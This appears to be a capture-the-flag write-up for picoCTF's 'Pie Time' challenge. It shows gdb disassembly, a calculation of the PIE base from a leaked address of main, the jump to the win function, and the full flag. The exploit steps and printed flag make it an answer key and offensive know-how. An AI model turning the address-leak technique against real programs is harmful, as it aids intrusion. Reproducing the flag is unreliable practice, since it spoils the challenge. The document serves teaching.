# [Pie Time (Binary Exploitation, Easy)](https://play.picoctf.org/practice/challenge/490) - Position-Independent Executable & Address Space Layout Randomization

- Description: Can you try to get the flag? Beware we have PIE! Additional details will be available after launching your challenge instance.
- Hints: Can you figure out what changed between the address you found locally and in the server output?
- Solution:
  ```bash
  schufot-picoctf@webshell:~$ nc rescued-float.picoctf.net 52049
  Address of main: 0x624b67ab833d
  Enter the address to jump to, ex => 0x12345:
  ```
  ```bash
  schufot-picoctf@webshell:~$ file vuln
  vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,     BuildID[sha1]=0072413e1b5a0613219f45518ded05fc685b680a, for GNU/Linux 3.2.0, not stripped
  ```
  ```bash
  schufot-picoctf@webshell:~$ gdb vuln
  GNU gdb (GDB) 16.3
  Copyright (C) 2024 Free Software Foundation, Inc.
  License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
  This is free software: you are free to change and redistribute it.
  There is NO WARRANTY, to the extent permitted by law.
  Type "show copying" and "show warranty" for details.
  This GDB was configured as "x86_64-pc-linux-gnu".
  Type "show configuration" for configuration details.
  For bug reporting instructions, please see:
  <https://www.gnu.org/software/gdb/bugs/>.
  Find the GDB manual and other documentation resources online at:
      <http://www.gnu.org/software/gdb/documentation/>.
  
  For help, type "help".
  Type "apropos word" to search for commands related to "word"...
  Reading symbols from vuln...
  
  This GDB supports auto-downloading debuginfo from the following URLs:
    <https://debuginfod.archlinux.org>
  Enable debuginfod for this session? (y or [n]) y
  Debuginfod has been enabled.
  To make this setting permanent, add 'set debuginfod enabled on' to .gdbinit.
  (No debugging symbols found in vuln)
  (gdb) 
  (gdb) disass win
  Dump of assembler code for function win:
     0x00000000000012a7 <+0>:     endbr64
     0x00000000000012ab <+4>:     push   %rbp
     0x00000000000012ac <+5>:     mov    %rsp,%rbp
     0x00000000000012af <+8>:     sub    $0x10,%rsp
     0x00000000000012b3 <+12>:    lea    0xd74(%rip),%rdi        # 0x202e
     0x00000000000012ba <+19>:    call   0x1100 <puts@plt>
     0x00000000000012bf <+24>:    lea    0xd71(%rip),%rsi        # 0x2037
     0x00000000000012c6 <+31>:    lea    0xd6c(%rip),%rdi        # 0x2039
     0x00000000000012cd <+38>:    call   0x1170 <fopen@plt>
     0x00000000000012d2 <+43>:    mov    %rax,-0x8(%rbp)
     0x00000000000012d6 <+47>:    cmpq   $0x0,-0x8(%rbp)
     0x00000000000012db <+52>:    jne    0x12f3 <win+76>
     0x00000000000012dd <+54>:    lea    0xd5e(%rip),%rdi        # 0x2042
     0x00000000000012e4 <+61>:    call   0x1100 <puts@plt>
     0x00000000000012e9 <+66>:    mov    $0x0,%edi
     0x00000000000012ee <+71>:    call   0x1190 <exit@plt>
     0x00000000000012f3 <+76>:    mov    -0x8(%rbp),%rax
     0x00000000000012f7 <+80>:    mov    %rax,%rdi
     0x00000000000012fa <+83>:    call   0x1140 <fgetc@plt>
     0x00000000000012ff <+88>:    mov    %al,-0x9(%rbp)
     0x0000000000001302 <+91>:    jmp    0x131e <win+119>
     0x0000000000001304 <+93>:    movsbl -0x9(%rbp),%eax
     0x0000000000001308 <+97>:    mov    %eax,%edi
     0x000000000000130a <+99>:    call   0x10f0 <putchar@plt>
     0x000000000000130f <+104>:   mov    -0x8(%rbp),%rax
     0x0000000000001313 <+108>:   mov    %rax,%rdi
     0x0000000000001316 <+111>:   call   0x1140 <fgetc@plt>
     0x000000000000131b <+116>:   mov    %al,-0x9(%rbp)
     0x000000000000131e <+119>:   cmpb   $0xff,-0x9(%rbp)
     0x0000000000001322 <+123>:   jne    0x1304 <win+93>
     0x0000000000001324 <+125>:   mov    $0xa,%edi
     0x0000000000001329 <+130>:   call   0x10f0 <putchar@plt>
     0x000000000000132e <+135>:   mov    -0x8(%rbp),%rax
     0x0000000000001332 <+139>:   mov    %rax,%rdi
     0x0000000000001335 <+142>:   call   0x1110 <fclose@plt>
     0x000000000000133a <+147>:   nop
     0x000000000000133b <+148>:   leave
     0x000000000000133c <+149>:   ret
  End of assembler dump.
  (gdb) disass main
  Dump of assembler code for function main:
     0x000000000000133d <+0>:     endbr64
     0x0000000000001341 <+4>:     push   %rbp
     0x0000000000001342 <+5>:     mov    %rsp,%rbp
     0x0000000000001345 <+8>:     sub    $0x20,%rsp
     0x0000000000001349 <+12>:    mov    %fs:0x28,%rax
     0x0000000000001352 <+21>:    mov    %rax,-0x8(%rbp)
     0x0000000000001356 <+25>:    xor    %eax,%eax
     0x0000000000001358 <+27>:    lea    -0xd6(%rip),%rsi        # 0x1289 <segfault_handler>
     0x000000000000135f <+34>:    mov    $0xb,%edi
     0x0000000000001364 <+39>:    call   0x1150 <signal@plt>
     0x0000000000001369 <+44>:    mov    0x2ca0(%rip),%rax        # 0x4010 <stdout@@GLIBC_2.2.5>
     0x0000000000001370 <+51>:    mov    $0x0,%ecx
     0x0000000000001375 <+56>:    mov    $0x2,%edx
     0x000000000000137a <+61>:    mov    $0x0,%esi
     0x000000000000137f <+66>:    mov    %rax,%rdi
     0x0000000000001382 <+69>:    call   0x1160 <setvbuf@plt>
     0x0000000000001387 <+74>:    lea    -0x51(%rip),%rsi        # 0x133d <main>
     0x000000000000138e <+81>:    lea    0xcbf(%rip),%rdi        # 0x2054
     0x0000000000001395 <+88>:    mov    $0x0,%eax
     0x000000000000139a <+93>:    call   0x1130 <printf@plt>
     0x000000000000139f <+98>:    lea    0xcca(%rip),%rdi        # 0x2070
     0x00000000000013a6 <+105>:   mov    $0x0,%eax
     0x00000000000013ab <+110>:   call   0x1130 <printf@plt>
     0x00000000000013b0 <+115>:   lea    -0x18(%rbp),%rax
     0x00000000000013b4 <+119>:   mov    %rax,%rsi
     0x00000000000013b7 <+122>:   lea    0xce0(%rip),%rdi        # 0x209e
     0x00000000000013be <+129>:   mov    $0x0,%eax
     0x00000000000013c3 <+134>:   call   0x1180 <__isoc99_scanf@plt>
     0x00000000000013c8 <+139>:   mov    -0x18(%rbp),%rax
     0x00000000000013cc <+143>:   mov    %rax,%rsi
     0x00000000000013cf <+146>:   lea    0xccc(%rip),%rdi        # 0x20a2
     0x00000000000013d6 <+153>:   mov    $0x0,%eax
     0x00000000000013db <+158>:   call   0x1130 <printf@plt>
     0x00000000000013e0 <+163>:   mov    -0x18(%rbp),%rax
     0x00000000000013e4 <+167>:   mov    %rax,-0x10(%rbp)
     0x00000000000013e8 <+171>:   mov    -0x10(%rbp),%rax
     0x00000000000013ec <+175>:   call   *%rax
     0x00000000000013ee <+177>:   mov    $0x0,%eax
     0x00000000000013f3 <+182>:   mov    -0x8(%rbp),%rdx
     0x00000000000013f7 <+186>:   xor    %fs:0x28,%rdx
     0x0000000000001400 <+195>:   je     0x1407 <main+202>
     0x0000000000001402 <+197>:   call   0x1120 <__stack_chk_fail@plt>
     0x0000000000001407 <+202>:   leave
     0x0000000000001408 <+203>:   ret
  End of assembler dump.
  ```
  - Runtime address of main: 0x624b67ab833d
  - Offset of main in binary = 0x133d
  - Offset of win in binary = 0x12a7
  - PIE base address: PIE_BASE = 0x624b67ab833d - 0x133d = 0x624b67ab7000
  - Address of win: WIN_ADDR = PIE_BASE + 0x12a7 = 0x624b67ab7000 + 0x12a7 = 0x624b67ab82a7
  ```bash
  schufot-picoctf@webshell:~$ nc rescued-float.picoctf.net 52049
  Address of main: 0x624b67ab833d
  Enter the address to jump to, ex => 0x12345: 0x624b67ab82a7
  Your input: 624b67ab82a7
  You won!
  picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_31cc212b}
  ```
- Flag: `picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_31cc212b}`
- Explanation:
  - PIE (Position-Independent Executable): Security feature that compiles binaries in a way that allows the entire program to be loaded at a random address in memory
    - Every function (like main() or win()) is placed at an offset relative to the base address of the binary
    - At runtime, this base address is randomized
  - Address Space Layout Randomization (ASLR): Security mechanism that randomizes the memory layout of processes to prevent attacks like return-to-libc or ROP (Return-Oriented Programming)
    - With ASLR + PIE: The actual address of main() will change each time the program runs, but the offset of main() and win() relative to the binary base stays the same
